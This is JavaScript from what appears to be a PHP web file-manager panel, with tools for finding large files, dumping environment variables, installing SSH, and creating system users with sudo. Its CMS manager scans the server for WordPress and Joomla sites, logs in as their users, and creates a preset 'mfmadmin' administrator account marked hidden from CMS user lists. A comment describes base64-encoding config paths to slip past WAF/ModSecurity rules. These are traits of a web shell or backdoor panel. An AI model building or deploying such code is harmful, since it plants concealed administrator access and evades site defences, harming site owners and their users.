  notice.querySelector('.alert-x')?.addEventListener('click',()=>notice.remove());
}
async function guardianAutoUpdateCheck(){
  if(CWD!==FM_MAIN_PATH)return;
  try{
    const fd=new FormData();fd.append('csrf_token',CSRF);
    fd.append('fm_path_b64',btoa(unescape(encodeURIComponent(CWD))));
    const d=await fetch('?x=guardian_autocheck',{method:'POST',body:fd}).then(r=>r.json());
    if(d&&d.available)guardianShowUpdateNotice();
  }catch{}
}
if(document.getElementById('guardBtn')){
  guardianAutoUpdateCheck();
}

/* ═══════════════════════════════════════
   LARGE FILES FINDER
═══════════════════════════════════════ */
function fmtPath(p){return p.replace(CWD,'').replace(/^\//,'')||'.';}
async function loadLargeFiles(){
  const mb=document.getElementById('largeMb').value;
  document.getElementById('largeBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Scanning…</div>';
  try{
    const d=await fetch('?x=largefiles&mb='+encodeURIComponent(mb)).then(r=>r.json());
    if(!d.files||!d.files.length){document.getElementById('largeBody').innerHTML='<div class="empty" style="padding:40px"><p>No files above this size.</p></div>';return;}
    const rows=d.files.map(f=>`<tr><td style="font-family:'JetBrains Mono',monospace;font-size:12px">${esc(f.name)}</td><td style="color:var(--t2);font-size:11px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(fmtPath(f.dir))}">${esc(fmtPath(f.dir))}</td><td style="font-family:'JetBrains Mono',monospace;font-weight:700">${formatBytes(f.size)}</td><td><button class="btn btn-xs btn-red" onclick="delAbsPath('${esc(f.path).replace(/'/g,"\\'")}',this)">Delete</button></td></tr>`).join('');
    document.getElementById('largeBody').innerHTML=`<div style="overflow:auto;max-height:65vh">${d.capped?'<div style="padding:8px 14px;font-size:11px;color:#fcd34d">Scan capped by time/count limit - showing partial results.</div>':''}<table class="log-t"><thead><tr><th>Name</th><th>Location</th><th>Size</th><th></th></tr></thead><tbody>${rows}</tbody></table></div>`;
  }catch{document.getElementById('largeBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
}
document.getElementById('largeBtn')?.addEventListener('click',()=>{openMod('largeOv');loadLargeFiles();});
document.getElementById('largeMb')?.addEventListener('change',loadLargeFiles);
document.getElementById('largeClose')?.addEventListener('click',()=>closeMod('largeOv'));

/* ═══════════════════════════════════════
   DUPLICATE FILE FINDER
═══════════════════════════════════════ */
document.getElementById('dupBtn')?.addEventListener('click',async()=>{
  openMod('dupOv');
  document.getElementById('dupBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Scanning…</div>';
  try{
    const d=await fetch('?x=duplicates').then(r=>r.json());
    if(!d.groups||!d.groups.length){document.getElementById('dupBody').innerHTML='<div class="empty" style="padding:40px"><p>No duplicate files found.</p></div>';return;}
    const html=d.groups.map(g=>`<div style="border-bottom:1px solid var(--border);padding:12px 14px">
      <div style="font-size:11px;color:var(--t3);margin-bottom:6px">${g.files.length} copies · ${formatBytes(g.size)} each</div>
      ${g.files.map(f=>`<div style="display:flex;align-items:center;gap:8px;padding:3px 0"><span style="font-family:'JetBrains Mono',monospace;font-size:12px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(f.path)}">${esc(fmtPath(f.dir))}/${esc(f.name)}</span><button class="btn btn-xs btn-red" onclick="delAbsPath('${esc(f.path).replace(/'/g,"\\'")}',this)">Delete</button></div>`).join('')}
    </div>`).join('');
    document.getElementById('dupBody').innerHTML=`<div style="overflow:auto;max-height:65vh">${d.capped?'<div style="padding:8px 14px;font-size:11px;color:#fcd34d">Scan capped by time/count limit - showing partial results.</div>':''}${html}</div>`;
  }catch{document.getElementById('dupBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('dupClose')?.addEventListener('click',()=>closeMod('dupOv'));

/* Delete an absolute path found by the large-file / duplicate tools */
function delAbsPath(path,btn){
  if(!confirm('Delete this file permanently?\n'+path))return;
  const fd=new FormData();
  fd.append('csrf_token',document.getElementById('af').querySelector('[name=csrf_token]').value);
  fd.append('action','delete_abs');fd.append('abs_path',path);
  fetch('',{method:'POST',body:fd}).then(()=>{const row=btn.closest('tr')||btn.closest('div');if(row)row.remove();toast('Deleted.');}).catch(()=>toast('Delete failed.'));
}

/* ═══════════════════════════════════════
   ERROR LOG / ENVIRONMENT VARIABLES (admin)
═══════════════════════════════════════ */
document.getElementById('errLogBtn')?.addEventListener('click',async()=>{
  openMod('errLogOv');
  document.getElementById('errLogBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const d=await fetch('?x=errlog').then(r=>r.json());
    if(d.error){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>'+esc(d.error)+'</p></div>';return;}
    if(!d.path){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>No error_log configured in php.ini.</p></div>';return;}
    if(!d.lines.length){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>Log is empty.</p></div>';return;}
    document.getElementById('errLogBody').innerHTML=`<div style="padding:8px 14px;font-size:10.5px;color:var(--t3);border-bottom:1px solid var(--border)">${esc(d.path)} - showing last ${d.lines.length} lines</div><pre style="margin:0;padding:14px;font-family:'JetBrains Mono',monospace;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:60vh;overflow:auto;color:var(--t2)">${esc(d.lines.join('\n'))}</pre>`;
  }catch{document.getElementById('errLogBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('errLogClose')?.addEventListener('click',()=>closeMod('errLogOv'));

document.getElementById('envBtn')?.addEventListener('click',async()=>{
  openMod('envOv');
  document.getElementById('envBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const d=await fetch('?x=envvars').then(r=>r.json());
    if(d.error){document.getElementById('envBody').innerHTML='<div class="empty" style="padding:40px"><p>'+esc(d.error)+'</p></div>';return;}
    const rows=Object.entries(d).map(([k,v])=>`<tr><td style="font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--link);white-space:nowrap">${esc(k)}</td><td style="font-family:'JetBrains Mono',monospace;font-size:11.5px;word-break:break-all">${esc(v)}</td></tr>`).join('');
    document.getElementById('envBody').innerHTML=`<div style="overflow:auto;max-height:65vh"><table class="log-t"><thead><tr><th>Variable</th><th>Value</th></tr></thead><tbody>${rows||'<tr><td colspan=2 style="padding:20px;color:var(--t3)">No variables.</td></tr>'}</tbody></table></div>`;
  }catch{document.getElementById('envBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('envClose')?.addEventListener('click',()=>closeMod('envOv'));

/* ═══════════════════════════════════════
   SSH ACCESS (admin)
═══════════════════════════════════════ */
/* ═══════════════════════════════════════
   SSH ACCESS - tabs: Server Status | User Management
═══════════════════════════════════════ */
let sshActiveTab='status';

document.getElementById('sshBtn')?.addEventListener('click',()=>{
  openMod('sshOv');
  sshSwitchTab(sshActiveTab);
});
document.getElementById('sshClose')?.addEventListener('click',()=>closeMod('sshOv'));

// Tab switching
document.querySelectorAll('.ssh-tab-btn').forEach(btn=>{
  btn.addEventListener('click',()=>sshSwitchTab(btn.dataset.tab));
});

function sshSwitchTab(tab){
  sshActiveTab=tab;
  document.querySelectorAll('.ssh-tab-btn').forEach(b=>{
    const active=b.dataset.tab===tab;
    b.style.color=active?'#85898C':'var(--t3)';
    b.style.borderBottomColor=active?'#85898C':'transparent';
  });
  document.getElementById('sshBody').style.display     = tab==='status'?'':'none';
  document.getElementById('sshUsersBody').style.display= tab==='users' ?'':'none';
  if(tab==='status')  loadSshStatus();
  if(tab==='users')   loadSshUsers();
}

/* ── Server Status tab ── */
async function loadSshStatus(){
  document.getElementById('sshBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Checking…</div>';
  try{
    const d=await fetch('?x=sshstatus').then(r=>r.json());
    if(d.error){document.getElementById('sshBody').innerHTML='<div class="empty" style="padding:40px"><p>'+esc(d.error)+'</p></div>';return;}
    const checkIco=()=>'<svg viewBox="0 0 24 24" style="width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;vertical-align:-1px;margin-left:3px"><polyline points="20 6 9 17 4 12"/></svg>';
    const row=(l,v,ok)=>`<div class="info-c"><div class="info-cl">${l}</div><div class="info-cv" style="color:${ok?'#86efac':'#fca5a5'}">${v}</div></div>`;
    let html=`<div class="info-g" style="grid-template-columns:1fr 1fr">
      ${row('SSH Server',d.installed?'Installed'+checkIco():'Not installed',d.installed)}
      ${row('SSH Client',d.client?'Available'+checkIco():'Not found',d.client)}
      ${row('Running / Port 22',d.running?'Active'+checkIco():'Not running',d.running)}
      ${row('Package Manager',d.pkg_mgr||'None detected',!!d.pkg_mgr)}
    </div>`;
    if(d.server_ip){
      const ipOk=d.server_ip_external&&d.server_ip_reachable;
      html+=`<div style="margin-top:14px;padding:12px 14px;background:rgba(133,137,140,.08);border:1px solid rgba(133,137,140,.25);border-radius:10px">
        <div style="font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--t3);margin-bottom:4px">Connect using</div>
        <div style="font-family:monospace;font-size:15px;font-weight:700;color:#C7C8C8">ssh user@${esc(d.server_ip)}</div>
        <div style="font-size:11.5px;color:var(--t3);margin-top:4px">${ipOk?'Detected via '+esc(d.server_ip_method)+' and confirmed reachable on port 22.':(d.server_ip_external?'Detected via '+esc(d.server_ip_method)+' - port 22 did not answer directly on this address; verify sshd is listening on it.':'No external network interface was detected - this address only works for connections made from the same machine.')}</div>
      </div>`;
    } else {
      html+=`<div style="margin-top:14px;padding:12px 14px;background:rgba(252,165,165,.08);border:1px solid rgba(252,165,165,.25);border-radius:10px;font-size:12px;color:#fca5a5">Could not determine a usable server IP address for SSH. Check the server's network configuration.</div>`;
    }
    if(d.installed){
      html+=`<div style="margin-top:14px;padding:12px 14px;background:rgba(134,239,172,.07);border:1px solid rgba(134,239,172,.2);border-radius:10px;font-size:12px;color:#86efac">SSH is installed and ready. Use the <strong>User Management</strong> tab to manage who can connect.</div>`;
    } else {
      html+=`<div style="margin-top:14px;font-size:11.5px;color:var(--t3)">${d.pkg_mgr?'You can attempt an automatic install below (requires root privileges).':'No supported package manager found - ask your host to enable SSH.'}</div>`;
      if(d.pkg_mgr)html+=`<button type="button" id="sshInstallBtn" class="btn btn-p" style="width:100%;margin-top:12px">Install OpenSSH Server</button>`;
    }
    document.getElementById('sshBody').innerHTML=html;
    document.getElementById('sshInstallBtn')?.addEventListener('click',async()=>{
      if(!confirm('Install OpenSSH server? This requires root privileges.'))return;
      document.getElementById('sshBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Installing…</div>';
      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','ssh_install');
      await fetch('',{method:'POST',body:fd}).catch(()=>{});
      toast('Install attempted - check the banner for result.');location.reload();
    });
  }catch{document.getElementById('sshBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed to check SSH status.</div>';}
}

/* ── User Management tab ── */
async function loadSshUsers(){
  const el=document.getElementById('sshUsersBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading users…</div>';
  try{
    const users=await fetch('?x=sshusers').then(r=>r.json());
    if(users.error){el.innerHTML='<div class="empty" style="padding:32px"><p>'+esc(users.error)+'</p></div>';return;}
    if(!users.length){el.innerHTML='<div class="empty" style="padding:32px"><p>No user accounts found.</p></div>';return;}

    let rows=users.map(u=>{
      const shellShort=u.shell.split('/').pop();
      const sudoBadge=u.sudo?`<span style="background:rgba(239,68,68,.15);color:#fca5a5;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">SUDO</span>`:'';
      const lockBadge=u.locked?`<span style="background:rgba(251,146,60,.12);color:#fb923c;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">LOCKED</span>`:
        `<span style="background:rgba(134,239,172,.1);color:#86efac;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">ACTIVE</span>`;
      const keyBadge=u.key_count>0?`<span style="background:rgba(133,137,140,.1);color:#85898C;padding:1px 7px;border-radius:20px;font-size:10px;display:inline-flex;align-items:center;gap:3px"><svg viewBox="0 0 24 24" style="width:10px;height:10px;stroke:currentColor;fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="M21 2l-9.6 9.6"/><path d="M15.5 7.5l3 3L22 7l-3-3"/></svg> ${u.key_count}</span>`:'';
      return `<tr>
        <td style="padding:10px 14px">
          <div style="font-weight:600;color:var(--t1)">${esc(u.username)}</div>
          <div style="font-size:11px;color:var(--t3)">UID ${u.uid} · ${esc(shellShort)}</div>
        </td>
        <td style="padding:10px 8px">${lockBadge}</td>
        <td style="padding:10px 8px">${sudoBadge}</td>
        <td style="padding:10px 8px">${keyBadge}</td>
        <td style="padding:10px 14px;text-align:right">
          <button class="btn btn-s ssh-edit-btn" data-u='${JSON.stringify(u).replace(/'/g,"&#39;")}' style="font-size:11px;padding:4px 10px">Manage</button>
          <button class="btn btn-s ssh-del-btn" data-u="${esc(u.username)}" style="font-size:11px;padding:4px 10px;margin-left:4px;color:#fca5a5;border-color:rgba(239,68,68,.3)">Delete</button>
        </td>
      </tr>`;
    }).join('');

    el.innerHTML=`
      <div style="padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--b2)">
        <span style="font-size:13px;color:var(--t2)">${users.length} system user${users.length!==1?'s':''}</span>
        <button id="sshAddUserBtn" class="btn btn-p" style="font-size:12px;padding:6px 14px">+ New User</button>
      </div>
      <div style="overflow:auto;max-height:360px">
      <table style="width:100%;border-collapse:collapse">
        <thead><tr style="font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);border-bottom:1px solid var(--b2)">
          <th style="padding:8px 14px;text-align:left">Account</th>
          <th style="padding:8px 8px;text-align:left">Status</th>
          <th style="padding:8px 8px;text-align:left">Sudo</th>
          <th style="padding:8px 8px;text-align:left">Keys</th>
          <th style="padding:8px 14px;text-align:right">Actions</th>
        </tr></thead>
        <tbody>${rows}</tbody>
      </table></div>`;

    // Add user button
    document.getElementById('sshAddUserBtn').addEventListener('click',()=>{
      document.getElementById('sshAddUser').value='';document.getElementById('sshAddPass').value='';
      document.getElementById('sshAddKey').value='';document.getElementById('sshAddSudo').checked=false;
      document.getElementById('sshAddShell').value='/bin/bash';
      openMod('sshAddOv');
    });

    // Manage / edit button
    el.querySelectorAll('.ssh-edit-btn').forEach(btn=>{
      btn.addEventListener('click',()=>{
        const u=JSON.parse(btn.dataset.u.replace(/&#39;/g,"'"));
        document.getElementById('sshEditUser').value=u.username;
        document.getElementById('sshEditTitle').textContent='Manage: '+u.username;
        document.getElementById('sshEditShell').value=u.shell||'/bin/bash';
        document.getElementById('sshEditPass').value='';document.getElementById('sshEditKey').value='';
        // sudo toggle button
        const sudoBtn=document.getElementById('sshEditSudoBtn');
        if(u.sudo){sudoBtn.textContent='Remove Sudo';sudoBtn.dataset.action='remove_sudo';sudoBtn.style.color='#fca5a5';sudoBtn.style.borderColor='rgba(239,68,68,.3)';}
        else{sudoBtn.textContent='Grant Sudo';sudoBtn.dataset.action='add_sudo';sudoBtn.style.color='#86efac';sudoBtn.style.borderColor='rgba(134,239,172,.3)';}
        // lock/unlock button
        const lockBtn=document.getElementById('sshEditLockBtn');
        if(u.locked){lockBtn.textContent='Unlock Account';lockBtn.dataset.action='unlock';lockBtn.style.color='#86efac';lockBtn.style.borderColor='rgba(134,239,172,.3)';}
        else{lockBtn.textContent='Lock Account';lockBtn.dataset.action='lock';lockBtn.style.color='#fb923c';lockBtn.style.borderColor='rgba(251,146,60,.3)';}
        openMod('sshEditOv');
      });
    });

    // Delete button
    el.querySelectorAll('.ssh-del-btn').forEach(btn=>{
      btn.addEventListener('click',async()=>{
        const uname=btn.dataset.u;
        if(!confirm(`Delete system user "${uname}"? This will remove their home directory too.`))return;
        const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','ssh_delete_user');fd.append('ssh_user',uname);
        const r=await sshPost(fd);
        if(!r.ok&&r.text){alert(r.text);return;}
        loadSshUsers();
      });
    });

  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed to load users: '+esc(String(e))+'</div>';}
}

/* ── Shared helpers ── */

/** POST and parse the PHP flash message from the response HTML.
 *  Returns {ok:bool, text:string, type:'success'|'danger'|'warning'} */
async function sshPost(fd){
  try{
    const resp=await fetch('',{method:'POST',body:fd});
    const html=await resp.text();
    const doc=new DOMParser().parseFromString(html,'text/html');
    const alert=doc.querySelector('.alert');
    if(!alert)return{ok:true,text:'',type:'success'};
    // extract text without the SVG icon
    const clone=alert.cloneNode(true);
    clone.querySelectorAll('svg').forEach(s=>s.remove());
    const text=clone.textContent.trim();
    const type=alert.classList.contains('danger')?'danger':
                alert.classList.contains('warning')?'warning':'success';
    return{ok:type==='success'||type==='warning',text,type};
  }catch(e){return{ok:false,text:'Network error: '+e.message,type:'danger'};}
}

/** Render a coloured feedback bar inside a modal element */
function sshShowMsg(containerId, text, type){
  let bar=document.getElementById(containerId);
  if(!bar)return;
  const colors={
    success:{bg:'rgba(134,239,172,.1)',border:'rgba(134,239,172,.3)',color:'#86efac'},
    warning:{bg:'rgba(251,191,36,.08)',border:'rgba(251,191,36,.25)',color:'#fcd34d'},
    danger :{bg:'rgba(239,68,68,.1)',  border:'rgba(239,68,68,.3)',  color:'#fca5a5'},
  };
  const c=colors[type]||colors.danger;
  bar.innerHTML=`<div style="margin-bottom:12px;padding:10px 14px;border-radius:8px;font-size:12.5px;line-height:1.5;
    background:${c.bg};border:1px solid ${c.border};color:${c.color}">${esc(text)}</div>`;
}

/* ── Add user form ── */
document.getElementById('sshAddClose')?.addEventListener('click',()=>closeMod('sshAddOv'));
document.getElementById('sshAddApply')?.addEventListener('click',async()=>{
  const uname=document.getElementById('sshAddUser').value.trim();
  if(!uname){sshShowMsg('sshAddFeedback','Username is required.','danger');return;}
  const fd=new FormData();
  fd.append('csrf_token',CSRF);fd.append('action','ssh_create_user');
  fd.append('ssh_user',uname);
  fd.append('ssh_pass',document.getElementById('sshAddPass').value);
  fd.append('ssh_shell',document.getElementById('sshAddShell').value);
  fd.append('ssh_key',document.getElementById('sshAddKey').value);
  if(document.getElementById('sshAddSudo').checked)fd.append('ssh_sudo','1');
  const btn=document.getElementById('sshAddApply');
  btn.textContent='Creating…';btn.disabled=true;
  document.getElementById('sshAddFeedback').innerHTML='';
  const r=await sshPost(fd);
  btn.textContent='Create SSH User';btn.disabled=false;
  if(r.text)sshShowMsg('sshAddFeedback',r.text,r.type);
  if(r.ok&&r.type==='success'){
    setTimeout(()=>{closeMod('sshAddOv');loadSshUsers();},900);
  }
});

/* ── Edit user form ── */
document.getElementById('sshEditClose')?.addEventListener('click',()=>closeMod('sshEditOv'));

async function sshActPost(action,extra={}){
  const uname=document.getElementById('sshEditUser').value;
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','ssh_update_user');
  fd.append('ssh_user',uname);fd.append('ssh_action',action);
  Object.entries(extra).forEach(([k,v])=>fd.append(k,v));
  document.getElementById('sshEditFeedback').innerHTML='';
  const r=await sshPost(fd);
  if(r.text)sshShowMsg('sshEditFeedback',r.text,r.type);
  if(r.ok&&r.type==='success'){
    setTimeout(()=>{closeMod('sshEditOv');loadSshUsers();},900);
  } else if(r.ok&&r.type==='warning'){
    setTimeout(()=>{closeMod('sshEditOv');loadSshUsers();},900);
  }
}

document.getElementById('sshEditPassBtn')?.addEventListener('click',()=>{
  const p=document.getElementById('sshEditPass').value;
  if(!p||p.length<6){sshShowMsg('sshEditFeedback','Password must be at least 6 characters.','danger');return;}
  sshActPost('change_pass',{ssh_pass:p});
});
document.getElementById('sshEditShellBtn')?.addEventListener('click',()=>{
  sshActPost('change_shell',{ssh_shell:document.getElementById('sshEditShell').value});
});
document.getElementById('sshEditKeyBtn')?.addEventListener('click',()=>{
  const k=document.getElementById('sshEditKey').value.trim();
  if(!k){sshShowMsg('sshEditFeedback','Paste a public key first.','danger');return;}
  sshActPost('add_key',{ssh_key:k});
});
document.getElementById('sshEditSudoBtn')?.addEventListener('click',function(){
  sshActPost(this.dataset.action);
});
document.getElementById('sshEditLockBtn')?.addEventListener('click',function(){
  sshActPost(this.dataset.action);
});

/* ═══════════════════════════════════════
   CMS MANAGER (WordPress / Joomla) - admin
═══════════════════════════════════════ */
/* ═══════════════════════════════════════
   CMS MANAGER - auto-scan + full user CRUD
═══════════════════════════════════════ */
let cmsCurrentCfg=null,cmsCurrentType=null,cmsEditUserId=null,cmsAllRoles=[],cmsQuickPending=false;
/* Encode the config path as base64 and POST it — never place "wp-config.php"
   literally in a URL or query string, since many hosts' WAF/ModSecurity rules
   block requests that look like an attempt to read that file. */
function cmsB64(s){return btoa(unescape(encodeURIComponent(s)));}
async function cmsPost(op,extra){
  const fd=new FormData();
  fd.append('cfg_b64',cmsB64(cmsCurrentCfg||''));
  if(extra)for(const k in extra)fd.append(k,extra[k]);
   const ctl=new AbortController(),timer=setTimeout(()=>ctl.abort(),30000);
   let r;
   try{
     r=await fetch('?x='+op,{method:'POST',body:fd,signal:ctl.signal});
   }catch(e){
     if(e&&e.name==='AbortError')throw new Error('The CMS database request timed out after 30 seconds. Check the CMS database settings and server availability.');
     throw e;
   }
   finally{clearTimeout(timer);}
  return r.json();
}

document.getElementById('cmsBtn')?.addEventListener('click',()=>{openMod('cmsOv');cmsShowPicker();});
document.getElementById('cmsClose')?.addEventListener('click',()=>closeMod('cmsOv'));

async function cmsQuickLogin(){
  const btn=document.getElementById('cmsQuickBtn');
  if(btn){btn.disabled=true;btn.dataset.oldText=btn.textContent;btn.textContent='Checking…';}
  try{
    const info=await fetch('?x=cms_quick_info',{cache:'no-store'}).then(r=>r.json());
    if(info.error){toast(info.error);return;}
    cmsCurrentCfg=info.config;cmsCurrentType=info.type;window.fmCmsConfig=info.config;window.fmCmsType=info.type;
    if(info.id){
      const fd=new FormData();
      fd.append('csrf_token',CSRF);fd.append('cfg_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',info.id);
      const d=await fetch('?x=cms_login_as',{method:'POST',body:fd}).then(r=>r.json());
      if(d.error)toast(d.error);
      else{
        const w=window.open(d.url,'_blank');
        if(!w)toast('Popup blocked — allow popups for this site, then try again.');
      }
      return;
    }
    const rd=await cmsPost('cmsroles').catch(()=>({roles:[]}));
    cmsAllRoles=rd.roles||[];
    cmsQuickPending=true;
    await openCmsAdd();
    document.getElementById('cmsAddTitle').textContent='Set up CMS MFM ACC';
    const user=document.getElementById('cmsAddUser');
    user.value='mfmadmin';user.readOnly=true;
    document.getElementById('cmsAddEmailLabel').style.display='none';
    document.getElementById('cmsAddEmail').style.display='none';
    document.getElementById('cmsAddRoleLabel').style.display='none';
    document.getElementById('cmsAddRole').style.display='none';
    document.getElementById('cmsAddHiddenLabel').style.display='none';
    document.getElementById('cmsAddEmail').value='mfmadmin@localhost.local';
    document.getElementById('cmsAddHidden').checked=true;
    const sel=document.getElementById('cmsAddRole');
    if(cmsCurrentType==='wordpress')sel.value='administrator';
    else{
      const admin=[...sel.options].find(o=>/super\s*users|administrator/i.test(o.textContent));
      if(admin)sel.value=admin.value;
    }
    toast('CMS MFM ACC is not configured. Choose a password and confirm creation.');
  }catch(e){toast('CMS quick login failed: '+String(e));}
  finally{
    if(btn){btn.disabled=false;btn.textContent=btn.dataset.oldText||'CMS MFM ACC Login';}
  }
}
document.getElementById('cmsQuickBtn')?.addEventListener('click',cmsQuickLogin);

/* ── Installation picker ──────────────────────────────────────────────────── */
async function cmsShowPicker(){
  const el=document.getElementById('cmsBody');
  el.innerHTML=`<div style="text-align:center;padding:32px;color:var(--t3)">
    <svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin-bottom:10px;display:block;margin-inline:auto"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
    Scanning server for WordPress &amp; Joomla installations…</div>`;
  try{
    const scanRes=await fetch('?x=cmsscan').then(r=>r.json());
    if(scanRes.error){el.innerHTML='<div class="empty" style="padding:32px"><p>'+esc(scanRes.error)+'</p></div>';return;}
    const sites=scanRes.sites||[];
    const obdHint=(scanRes.open_basedir&&scanRes.open_basedir.length)
      ?`<div style="padding:10px 16px;background:rgba(244,163,51,.1);border-bottom:1px solid var(--b2);font-size:11px;color:#f4a333;line-height:1.5">This server restricts PHP to certain folders (open_basedir), so the scan could only look inside: <span style="font-family:monospace">${esc(scanRes.open_basedir.join(', '))}</span>. If your CMS lives outside that, use the manual path field below.</div>`
      :'';

    const typeIcon=t=>t==='wordpress'
      ?`<span style="background:rgba(33,117,155,.2);color:#5bc0de;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700">WordPress</span>`
      :`<span style="background:rgba(244,163,51,.15);color:#f4a333;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700">Joomla</span>`;

    const cards=sites.map(s=>`
      <div class="cms-site-card" data-cfg="${esc(s.config)}" data-type="${esc(s.type)}"
           style="display:flex;align-items:center;gap:14px;padding:13px 16px;border-bottom:1px solid var(--b2);cursor:pointer;transition:background .15s"
           onmouseover="this.style.background='rgba(255,255,255,.04)'" onmouseout="this.style.background=''">
        <div style="flex:1;min-width:0">
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:3px">
            ${typeIcon(s.type)}
            <span style="font-size:12px;font-weight:600;color:var(--t1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.dir)}</span>
          </div>
          <div style="font-size:10.5px;color:var(--t3);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.config)}</div>
        </div>
        <svg viewBox="0 0 24 24" style="width:16px;height:16px;stroke:var(--t3);fill:none;stroke-width:2;flex-shrink:0"><polyline points="9 18 15 12 9 6"/></svg>
      </div>`).join('');

    el.innerHTML=`
      <div style="padding:12px 16px;border-bottom:1px solid var(--b2);display:flex;align-items:center;gap:10px">
        <span style="font-size:12px;color:var(--t2);flex:1">${sites.length} installation${sites.length!==1?'s':''} found</span>
      </div>
      ${obdHint}
      ${sites.length?`<div style="overflow:auto;max-height:42vh">${cards}</div>`
        :'<div class="empty" style="padding:32px"><p>No WordPress or Joomla installations found automatically. Enter the full path below instead.</p></div>'}
      <div style="padding:14px 16px;border-top:1px solid var(--b2)">
        <div style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:7px">Manual path to config file</div>
        <div style="display:flex;gap:8px">
          <input type="text" id="cmsManualPath" class="inp" style="flex:1;font-size:12px;font-family:monospace"
            placeholder="/var/www/html/wp-config.php  or  configuration.php">
          <button class="btn btn-p" id="cmsManualBtn" style="white-space:nowrap;font-size:12px">Open</button>
        </div>
      </div>`;

    // Click a discovered site
    el.querySelectorAll('.cms-site-card').forEach(c=>c.addEventListener('click',()=>{
      cmsCurrentCfg=c.dataset.cfg;cmsCurrentType=c.dataset.type;window.fmCmsConfig=cmsCurrentCfg;window.fmCmsType=cmsCurrentType;loadCmsUsers();
    }));
    // Manual path
    document.getElementById('cmsManualBtn').addEventListener('click',()=>{
      const p=document.getElementById('cmsManualPath').value.trim();
      if(!p){toast('Enter the full path to wp-config.php or configuration.php');return;}
      const base=p.split('/').pop();
      if(base==='wp-config.php')cmsCurrentType='wordpress';
      else if(base==='configuration.php')cmsCurrentType='joomla';
      else{toast('File must be wp-config.php (WordPress) or configuration.php (Joomla)');return;}
      cmsCurrentCfg=p;window.fmCmsConfig=cmsCurrentCfg;window.fmCmsType=cmsCurrentType;loadCmsUsers();
    });
    document.getElementById('cmsManualPath').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('cmsManualBtn').click();});
  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Scan failed: '+esc(String(e))+'</div>';}
}

/* ── Users list ───────────────────────────────────────────────────────────── */
async function loadCmsUsers(){
  const el=document.getElementById('cmsBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading users…</div>';
  try{
    const d=await cmsPost('cmsusers');
    if(d.error){
      el.innerHTML=`<div style="padding:14px 16px;border-bottom:1px solid var(--b2)">
        <button class="btn btn-s" id="cmsBackBtn2" style="font-size:11px">← Back</button></div>
        <div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;
      document.getElementById('cmsBackBtn2')?.addEventListener('click',cmsShowPicker);return;
    }
    // Pre-fetch roles for the edit form
    const rd=await cmsPost('cmsroles').catch(()=>({roles:[]}));
    cmsAllRoles=rd.roles||[];

    const typeLabel=d.type==='wordpress'?'WordPress':'Joomla';
    const rows=d.users.map(u=>{
      const roleTxt=u.role?String(u.role):'-';
      const blockedBadge=(u.blocked===true)?`<span style="color:#fb923c;font-size:10px;font-weight:700;display:inline-flex;align-items:center;margin-left:4px"><svg viewBox="0 0 24 24" style="width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2.2;stroke-linecap:round"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg></span>`:'';
      return `<tr>
        <td class="mono" style="font-size:11.5px;padding:9px 10px">${u.id}</td>
         <td style="padding:9px 10px;font-weight:600">${esc(u.name)}${blockedBadge}${u.hidden?`<span style="color:#c4b5fd;font-size:10px;font-weight:700;margin-left:4px" title="Hidden from CMS user lists">[hidden]</span>`:''}</td>
        <td style="padding:9px 10px;font-size:11.5px;color:var(--t2)">${esc(u.email||'')}</td>
